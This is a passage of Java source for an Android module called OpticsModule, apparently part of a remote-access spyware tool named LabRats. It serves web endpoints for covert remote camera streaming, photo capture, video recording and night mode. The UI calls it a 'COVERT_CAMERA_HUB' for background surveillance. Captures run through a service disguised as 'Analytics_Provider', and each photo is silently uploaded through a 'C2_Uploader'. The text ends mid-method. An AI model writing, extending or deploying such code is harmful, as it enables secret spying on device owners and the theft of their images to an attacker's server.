package com.labs.labrats.modules;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.labs.labrats.Analytics_Provider;
import com.labs.labrats.C2_Uploader;
import com.labs.labrats.CameraHelper;
import com.labs.labrats.Constants;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.MediaFrameworkService;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import androidx.annotation.OptIn;
import androidx.camera.camera2.interop.ExperimentalCamera2Interop;
import androidx.core.content.ContextCompat;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

@OptIn(markerClass = ExperimentalCamera2Interop.class)
public class OpticsModule extends BaseModule {

    public OpticsModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/camera")) {
            return serveCameraPage(session);
        } else if (uri.equals("/camera/capture")) {
            return serveCameraCapture(params, session);
        } else if (uri.equals("/camera/photo")) {
            return serveCameraPhoto(params);
        } else if (uri.equals("/camera/live")) {
            return serveLiveStreamPage(params, session);
        } else if (uri.equals("/camera/stream")) {
            return serveMJPEGStream(params);
        } else if (uri.equals("/camera/frame")) {
            return serveSingleFrame();
        } else if (uri.equals("/camera/start-stream")) {
            return startCameraStream(params);
        } else if (uri.equals("/camera/stop-stream")) {
            return stopCameraStream();
        } else if (uri.equals("/camera/record")) {
            return startVideoRecording(params);
        } else if (uri.equals("/camera/stop-record")) {
            return stopVideoRecording();
        } else if (uri.equals("/camera/terminate")) {
            return terminateAllCaptures();
        } else if (uri.equals("/camera/status")) {
            return serveCameraStatus();
        } else if (uri.equals("/camera/night-mode")) {
            return toggleNightMode();
        }
        return null;
    }

    private Response serveCameraPage(IHTTPSession session) {
        FirebaseConfig.logActivity("OPTICS_UPLINK: Tactical surveillance hub accessed");
        boolean nightMode = Analytics_Provider.isNightModeEnabled(context);
        Map<String, String> params = session.getParms();
        
        String camId = params.get("cam");
        boolean autostart = "true".equals(params.get("autostart"));
        
        String res = params.get("res");
        if (res == null) res = "low";
        
        int resIndex = 2;
        if ("ultra_low".equals(res)) resIndex = 0;
        else if ("very_low".equals(res)) resIndex = 1;
        else if ("low".equals(res)) resIndex = 2;
        else if ("medium".equals(res)) resIndex = 3;
        else if ("high".equals(res)) resIndex = 4;
        else if ("very_high".equals(res)) resIndex = 5;

        int width, height, quality, fps;
        switch (res) {
            case "ultra_low": width = 320; height = 240; quality = 12; fps = 2; break;
            case "very_low": width = 480; height = 320; quality = 20; fps = 4; break;
            case "medium": width = 640; height = 480; quality = 50; fps = 8; break;
            case "high": width = 1280; height = 720; quality = 85; fps = 10; break;
            case "very_high": width = 1920; height = 1080; quality = 100; fps = 10; break;
            case "low":
            default: width = 640; height = 480; quality = 35; fps = 6; break;
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.6rem;\">&#128247; COVERT_CAMERA_HUB <span class=\"info-trigger\" onclick=\"showInfo(event, 'COVERT_CAMERA_HUB', 'Tactical surveillance hub for remote optics and background recording.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
        html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
        html.append("<span id=\"indicator-text\">STANDBY</span>");
        html.append("</div>");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>Camera permission missing.</p></div></div>").append(getFooter());
                return server.serveGzippedProxy(session, "text/html", html.toString());
            }
        }

        html.append("<style>");
        html.append("@media(min-width:769px){ #stream-container { max-width: 100% !important; height: 600px !important; } #main-stream { object-fit: cover !important; } }");
        html.append("@media(max-width:768px){ #stream-container { height: 400px !important; } #main-stream { object-fit: contain !important; } }");
        html.append("</style>");
        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
        html.append("<div id=\"stream-container\" style=\"width:100%; max-width:100% !important; height: 450px; background:#000; margin:0 auto; border-radius:8px; border:1px solid var(--neon-cyan); position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
        html.append("<img id=\"main-stream\" style=\"width: 100%; height: 100%; object-fit: contain; ").append(autostart ? "display: block;" : "display: none;").append("\" />");
        html.append("<div id=\"loading-overlay\" style=\"position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:var(--neon-cyan); font-size:0.75rem; font-family:monospace; letter-spacing:2px; z-index: 5;\">").append(autostart ? "INITIALIZING_UPLINK..." : "Uplink_Ready").append("</div>");
        html.append("</div></div>");

        html.append("<div style=\"margin-bottom: 20px; text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">UPLINK_QUALITY</div>");
        html.append("<div style=\"position: relative; width: 100%; max-width: 500px; margin: 0 auto; padding: 0 10px;\">");
        html.append("<input type=\"range\" id=\"quality-slider\" min=\"0\" max=\"5\" value=\"").append(resIndex).append("\" onchange=\"applyQuality(this.value)\" style=\"width: 100%; margin: 0; padding: 0; cursor: pointer;\">");
        html.append("<div style=\"display: flex; justify-content: space-between; width: 100%; height: 20px; font-size: 0.5rem; color: #777; font-family: monospace; letter-spacing: 0; margin-top: 8px; position: relative;\">");
        html.append("<span style=\"width: 50px; text-align: left;\">ULTRA LOW</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">VL</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">L</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">M</span>");
        html.append("<span style=\"flex: 1; text-align: center;\">H</span>");
        html.append("<span style=\"width: 50px; text-align: right;\">VERY HIGH</span>");
        html.append("</div></div></div>");

        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        html.append("<div style=\"margin-bottom: 10px; text-align: center;\"><div class=\"info-label\" style=\"font-size: 0.7rem;\">CAMERAS</div></div>");
        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; margin-bottom: 25px; flex-wrap:wrap;\">");
        for (CameraHelper.CameraInfo cam : cameras) {
            String btnText = cam.facing.equalsIgnoreCase("back") ? "START_BACK" : "START_FRONT";
            boolean isActive = (camId != null && cam.id.equals(camId) && autostart);
            String btnClass = isActive ? "btn btn-small btn-engaged-green cam-btn" : "btn btn-small cam-btn";
            String inlineStyle = "min-width:140px; margin:0;" + (isActive ? "" : " border-color:var(--neon-green); color:var(--neon-green);");
            html.append("<button id=\"cam-btn-").append(cam.id).append("\" onclick=\"initiateStream('").append(cam.id).append("')\" class=\"").append(btnClass).append("\" style=\"").append(inlineStyle).append("\">&#9654; ").append(btnText).append("</button>");
        }
        html.append("</div>");

        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 450px; margin: 0 auto;\">");
        html.append("<button onclick=\"rotateStream()\" class=\"btn btn-small\" style=\"border-color:#f39c12; color:#f39c12; margin:0; width:100%;\">ROTATE</button>");
        html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); margin:0; width:100%;\">SNAP</button>");
        
        html.append("<button id=\"night-btn\" onclick=\"toggleNightMode()\" class=\"btn btn-small ").append(nightMode ? "btn-active-yellow" : "").append("\" style=\"border-color:var(--neon-yellow); color:var(--neon-yellow); margin:0; width:100%;\">NIGHTMODE</button>");
        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">START_RECORDING</button>");
        
        html.append("<button onclick=\"terminateCaptures()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color:var(--danger); color:var(--danger); margin:0; width:100%;\">TERMINATE_CAPTURE</button>");
        html.append("</div>");

        // --- RECORDINGS VAULT SECTION ---
        html.append("<div style=\"margin-top: 40px;\">");
        html.append("<h3 style=\"color: var(--neon-cyan); font-size: 0.9rem; text-align: left; margin-bottom: 15px; font-family: monospace; letter-spacing: 1px;\">RECORDINGS_VAULT</h3>");
        html.append("<div id=\"recordings-list\" style=\"background: rgba(0,0,0,0.4); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 8px; padding: 15px; min-height: 50px;\">");
        
        File videoDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "LabRATS-Security");
        File[] files = videoDir.listFiles();
        if (files != null && files.length > 0) {
            java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
            SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault());
            html.append("<ul style=\"list-style: none; padding: 0; margin: 0;\">");
            for (int i = 0; i < Math.min(files.length, 5); i++) {
                File f = files[i];
                String relPath = "Movies/LabRATS-Security/" + f.getName();
                String timeStr = sdf.format(new Date(f.lastModified()));
                html.append("<li style=\"display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05);\">");
                html.append("<div style=\"display:flex; flex-direction:column; gap:2px;\">");
                html.append("<span style=\"font-size: 0.7rem; color: #eee; font-family: monospace; word-break: break-all;\">").append(f.getName()).append("</span>");
                html.append("<span style=\"font-size: 0.55rem; color: var(--neon-cyan); opacity: 0.8; font-family: monospace;\">").append(timeStr).append("</span>");
                html.append("</div>");
                html.append("<a href=\"/download/").append(relPath).append("\" class=\"btn btn-small\" style=\"padding: 4px 12px; font-size: 0.6rem; margin: 0 0 0 15px; flex-shrink: 0;\">GET</a>");
                html.append("</li>");
            }
            html.append("</ul>");
            
            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap;\">");
            html.append("<a href=\"/files/Movies/LabRATS-Security\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin: 0; min-width: 120px;\">VIEW_ALL_RECORDINGS</a>");
            html.append("</div>");
        } else {
            html.append("<div style=\"font-size: 0.7rem; color: #555; text-align: center;\">[EMPTY] No recordings found.</div>");
        }
        html.append("</div></div>");

        html.append("<script>");
        html.append("var camId = ").append(camId != null ? "'" + camId + "'" : "null").append(";");
        html.append("var streamActive = ").append(autostart).append(";");
        html.append("var currentRotation = 0;");
        html.append("const resOptions = ['ultra_low', 'very_low', 'low', 'medium', 'high', 'very_high'];");
        html.append("const resConfig = {");
        html.append("  'ultra_low': { w: 640, h: 480, q: 15, fps: 2 },");
        html.append("  'very_low':  { w: 640, h: 480, q: 25, fps: 4 },");
        html.append("  'low':       { w: 640, h: 480, q: 35, fps: 6 },");
        html.append("  'medium':    { w: 640, h: 480, q: 45, fps: 8 },");
        html.append("  'high':      { w: 1920, h: 1080, q: 85, fps: 10 },");
        html.append("  'very_high': { w: 1920, h: 1080, q: 100, fps: 10 }");
        html.append("};");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var streamFps = ").append(fps).append(";");
        
        html.append("function rotateStream() { currentRotation = (currentRotation + 90) % 360; document.getElementById('main-stream').style.transform = 'rotate(' + currentRotation + 'deg)'; }");
        
        html.append("function applyQuality(val) { ");
        html.append("  const config = resConfig[resOptions[val]];");
        html.append("  streamWidth = config.w; streamHeight = config.h; streamQuality = config.q; streamFps = config.fps;");
        html.append("  if(streamActive) { startStream(); }");
        html.append("}");
        
        html.append("async function initiateStream(id) { ");
        html.append("  camId = id; streamActive = true; ");
        html.append("  document.getElementById('loading-overlay').style.display = 'block'; ");
        html.append("  document.getElementById('loading-overlay').innerText = 'INITIALIZING_UPLINK...'; ");
        
        html.append("  const ind = document.getElementById('live-indicator');");
        html.append("  const dot = document.getElementById('indicator-dot');");
        html.append("  const txt = document.getElementById('indicator-text');");
        html.append("  ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
        html.append("  dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
        
        html.append("  document.querySelectorAll('.cam-btn').forEach(b => { ");
        html.append("    b.classList.remove('btn-engaged-green'); ");
        html.append("    b.style.borderColor = 'var(--neon-green)'; ");
        html.append("    b.style.color = 'var(--neon-green)'; ");
        html.append("  }); ");
        html.append("  const activeBtn = document.getElementById('cam-btn-' + id); ");
        html.append("  if(activeBtn) { ");
        html.append("    activeBtn.classList.add('btn-engaged-green'); ");
        html.append("    activeBtn.style.borderColor = ''; ");
        html.append("    activeBtn.style.color = ''; ");
        html.append("  } ");
        
        html.append("  const img = document.getElementById('main-stream');");
        html.append("  img.style.display = 'none';"); 
        html.append("  await fetch('/camera/stop-stream'); ");
        html.append("  setTimeout(() => { ");
        html.append("    const streamUrl = '/camera/stream?cam=' + id + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality + '&t=' + Date.now();");
        html.append("    img.src = streamUrl;");
        html.append("    img.onload = () => { document.getElementById('loading-overlay').style.display = 'none'; img.style.display = 'block'; };");
        html.append("    /* Safety Trigger: Reveal stream after 5s if hardware is slow to warm up */ setTimeout(()=>{if(img.style.display==='none'){img.style.display='block'; document.getElementById('loading-overlay').style.display='none';}}, 5000);");
        html.append("  }, 800); ");
        html.append("}");
        
        html.append("function startStream() { initiateStream(camId); }");
        
        html.append("function toggleNightMode() { fetch('/camera/night-mode').then(r => r.json()).then(d => { document.getElementById('night-btn').classList.toggle('btn-active-yellow', d.nightMode); }); }");
        
        html.append("function terminateCaptures() { ");
        html.append("  streamActive = false; ");
        html.append("  const img = document.getElementById('main-stream'); img.src = ''; img.style.display = 'none'; ");
        html.append("  document.getElementById('loading-overlay').style.display = 'block'; ");
        html.append("  document.getElementById('loading-overlay').innerText = 'Uplink_Ready'; ");
        
        html.append("  const ind = document.getElementById('live-indicator');");
        html.append("  const dot = document.getElementById('indicator-dot');");
        html.append("  const txt = document.getElementById('indicator-text');");
        html.append("  ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)';");
        html.append("  dot.className = 'badge-dot'; txt.innerText = 'STANDBY';");
        
        html.append("  document.querySelectorAll('.cam-btn').forEach(b => { ");
        html.append("    b.classList.remove('btn-engaged-green'); ");
        html.append("    b.style.borderColor = 'var(--neon-green)'; ");
        html.append("    b.style.color = 'var(--neon-green)'; ");
        html.append("  }); ");
        
        html.append("  fetch('/camera/terminate').then(() => { document.getElementById('rec-btn').innerText = 'START_RECORDING'; }); ");
        html.append("}");
        
        html.append("function capturePhoto() { if(!camId) { alert('SELECT_CAMERA_FIRST'); return; } window.open('/camera/photo?cam=' + camId, '_blank'); }");
        
        html.append("function toggleRecording() { const btn = document.getElementById('rec-btn'); if(!streamActive) { alert('START_FEED_FIRST'); return; } if(btn.innerText.includes('START')) { btn.innerText = 'STOP_RECORDING'; fetch('/camera/record?cam=' + camId); } else { btn.innerText = 'START_RECORDING'; fetch('/camera/stop-record'); } }");
        
        html.append("function checkRecStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    const ind = document.getElementById('live-indicator');");
        html.append("    const dot = document.getElementById('indicator-dot');");
        html.append("    const txt = document.getElementById('indicator-text');");
        html.append("    const recBtn = document.getElementById('rec-btn');");
        html.append("    if (d.recording) {");
        html.append("      ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)';");
        html.append("      recBtn.innerText = 'STOP_RECORDING';");
        html.append("    } else if (streamActive) {");
        html.append("      ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
        html.append("      recBtn.innerText = 'START_RECORDING';");
        html.append("    } else {");
        html.append("      ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)';");
        html.append("      dot.className = 'badge-dot'; txt.innerText = 'STANDBY';");
        html.append("      recBtn.innerText = 'START_RECORDING';");
        html.append("    }");
        html.append("  });");
        html.append("}");
        html.append("window.onload = () => { const scroll = localStorage.getItem('optics_scroll'); if(scroll) { window.scrollTo(0, parseInt(scroll)); localStorage.removeItem('optics_scroll'); } if(streamActive && camId) { initiateStream(camId); } };");
        html.append("setInterval(checkRecStatus, 2000);");
        html.append("</script>");

        html.append("</div>").append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveCameraCapture(Map<String, String> params, IHTTPSession session) {
        String cameraId = params.get("cam");
        FirebaseConfig.logActivity("OPTICS_TRIGGER: Capture command sent to camera " + (cameraId != null ? cameraId : "0"));
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; 
        }

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128247; Capturing Photo...</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(getFooter());
                return server.serveGzippedProxy(session, "text/html", html.toString());
            }
        }

        try {
            byte[] imageData = null;
            String error = null;

            if (Analytics_Provider.isCurrentlyStreaming()) {
                imageData = Analytics_Provider.getNextFrame(1000);
                if (imageData == null) error = "Timeout waiting for frame from stream";
            } else {
                Analytics_Provider service = Analytics_Provider.getInstance();
                if (service == null) {
                    Intent intent = new Intent(context, Analytics_Provider.class);
                    androidx.core.content.ContextCompat.startForegroundService(context, intent);
                    for (int i = 0; i < 10; i++) {
                        Thread.sleep(200);
                        service = Analytics_Provider.getInstance();
                        if (service != null) break;
                    }
                }

                if (service != null) {
                    service.capturePhotoBackground(cameraId);
                    imageData = Analytics_Provider.waitForPhoto(12000);
                    error = Analytics_Provider.getLastCaptureError();
                } else {
                    CameraHelper cameraHelper = new CameraHelper(context);
                    imageData = cameraHelper.capturePhoto(cameraId);
                    error = cameraHelper.getLastError();
                }
            }

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=\"").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=\"").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(0, 242, 255, 0.1); border-radius: 10px; color: #00f2ff; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>"); 
        html.append("</div>"); 

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Camera permission not granted");
        }

        try {
            byte[] imageData = null;
            String errorMsg = null;

            if (Analytics_Provider.isCurrentlyStreaming()) {
                imageData = Analytics_Provider.getNextFrame(1500);
            } else {
                Analytics_Provider service = Analytics_Provider.getInstance();
                if (service != null) {
                    service.capturePhotoBackground(cameraId);
                    imageData = Analytics_Provider.waitForPhoto(12000);
                    errorMsg = Analytics_Provider.getLastCaptureError();
                } else {
                    CameraHelper cameraHelper = new CameraHelper(context);
                    imageData = cameraHelper.capturePhoto(cameraId);
                    errorMsg = cameraHelper.getLastError();
                }
            }

            if (imageData != null && imageData.length > 0) {
                byte[] finalData = imageData;
                String photoName = "photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg";
                LabRatsWorker.execute(() -> {
                    try {
                        File photoFile = new File(context.getCacheDir(), photoName);
                        try (java.io.FileOutputStream fos = new java.io.FileOutputStream(photoFile)) {
                            fos.write(finalData);
                        }
                        C2_Uploader.uploadFile(context, photoFile);
                    } catch (Exception ignored) {}
                });

                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition", "attachment; filename=\"" + photoName + "\"");
                return response;
            } else {
                return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", errorMsg != null ? errorMsg : "Failed to capture photo (Hardware Timeout)");
            }

        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Error capturing photo: " + e.getMessage());
        }
    }

    private Response serveLiveStreamPage(Map<String, String> params, IHTTPSession session) {
        String camId = params.get("cam");
        if (camId == null) camId = "0";

        String res = params.get("res");
        if (res == null) res = "low";
            
        int resIndex = 2;
        if ("ultra_low".equals(res)) resIndex = 0;
        else if ("very_low".equals(res)) resIndex = 1;
        else if ("low".equals(res)) resIndex = 2;
        else if ("medium".equals(res)) resIndex = 3;
        else if ("high".equals(res)) resIndex = 4;
        else if ("very_high".equals(res)) resIndex = 5;

        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 640; height = 480; quality = 15; fps = 2;
                resLabel = "Ultra Low (Optimized)";
                break;
            case "very_low":
                width = 640; height = 480; quality = 25; fps = 4;
                resLabel = "Very Low (Stable)";
                break;
            case "low":
            default:
                width = 640; height = 480; quality = 35; fps = 6;
                resLabel = "Low (Standard)";
                break;
            case "medium":
                width = 640; height = 480; quality = 45; fps = 8;
                resLabel = "Medium (640x480)";
                break;
            case "high":
                width = 1920; height = 1080; quality = 85; fps = 10;
                resLabel = "High (1080p)";
                break;
            case "very_high":
                width = 1920; height = 1080; quality = 100; fps = 10;
                resLabel = "Very High (Fidelity)";
                break;
        }

        int refreshRate = 1000 / fps; 

        int uiHeight = 320;
        if ("ultra_low".equals(res)) uiHeight = 200;
        else if ("very_low".equals(res)) uiHeight = 240;
        else if ("low".equals(res)) uiHeight = 280;
        else if ("medium".equals(res)) uiHeight = 320;
        else if ("high".equals(res)) uiHeight = 380;
        else if ("very_high".equals(res)) uiHeight = 420;

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<style>")
            .append("@media (min-width: 769px) {")
            .append("  #stream-container { max-width: 680px !important; height: 420px !important; margin: 0 auto !important; }")
            .append("  #stream { width: 100% !important; height: 100% !important; object-fit: contain !important; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.3); }")
            .append("  .optics-control-box { transform: scale(0.90) !important; transform-origin: top center !important; }")
            .append("}")
            .append("@media (max-width: 768px) {")
            .append("  #stream-container { height: ").append(uiHeight).append("px !important; }")
            .append("  #stream { object-fit: contain !important; }")
            .append("}")
            .append("</style>");
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.6rem;\">&#128249; LIVE_STREAM_UPLINK <span class=\"info-trigger\" onclick=\"showInfo(event, 'LIVE_STREAM', 'Real-time MJPEG feed from the device camera.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
        html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
        html.append("<span id=\"indicator-text\">STANDBY</span>");
        html.append("</div>");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(getFooter());
                return server.serveGzippedProxy(session, "text/html", html.toString());
            }
        }

        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span id=\"res-banner\" style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: flex; align-items: center; justify-content: center; width: 100%; max-width: 100% !important; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; overflow: hidden; margin: 0 auto; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"width: 100%; height: 100%; object-fit: contain; display: block; transition: transform 0.3s ease;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 6px; font-size: 0.65rem; border: 1px solid rgba(255,255,255,0.1); z-index: 10; white-space: nowrap;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 8px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; z-index: 5; font-family: monospace; font-size: 0.8rem;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 4px 8px; border-radius: 6px; font-size: 0.65rem; display: none; z-index: 10; border: 1px solid rgba(255,255,255,0.1);\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        html.append("<div class=\"optics-control-box\">");
        html.append("<div style=\"margin-bottom: 30px; text-align: center; max-width: 500px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: center; font-size: 0.7rem;\">UPLINK_QUALITY</div>");
        html.append("<div style=\"position: relative; width: 100%;\">");
        html.append("<input type=\"range\" id=\"quality-slider\" min=\"0\" max=\"5\" value=\"").append(resIndex).append("\" onchange=\"applyQuality(this.value)\" style=\"width: 100%; margin: 0; padding: 0; cursor: pointer;\">");
